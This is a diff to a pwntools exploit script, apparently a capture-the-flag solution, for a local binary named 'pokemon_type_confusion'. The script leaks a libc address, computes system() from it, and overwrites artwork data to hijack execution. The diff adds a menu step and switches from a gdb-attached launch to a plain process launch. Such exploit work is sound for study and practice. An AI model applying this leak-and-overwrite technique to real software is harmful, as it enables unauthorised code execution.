@@ -89,6 +89,9 @@ def replace_art_exploit(p, system):
 
     p.sendline(preamble + kakuna_print + b'B'*filler_len)
 
+    p.recvuntil('artwork\n')
+    p.sendline(b'3')
+
 def exploit(p):
     ''''''
     for i in range(4): #Catch 4 kakuna's
@@ -103,10 +106,10 @@ def exploit(p):
     system = read_leak - 0xc2000
     replace_art_exploit(p, system)
 
-#p = process(['./ld-linux.so.2', '--library-path','.','./pokemon_type_confusion'])
-p = gdb.debug(['./ld-linux.so.2', '--library-path','.','./pokemon_type_confusion'],'''
-c            
-''')
+p = process(['./ld-linux.so.2', '--library-path','.','./pokemon_type_confusion'])
+#p = gdb.debug(['./ld-linux.so.2', '--library-path','.','./pokemon_type_confusion'],'''
+#c            
+#''')
 
 exploit(p)
 
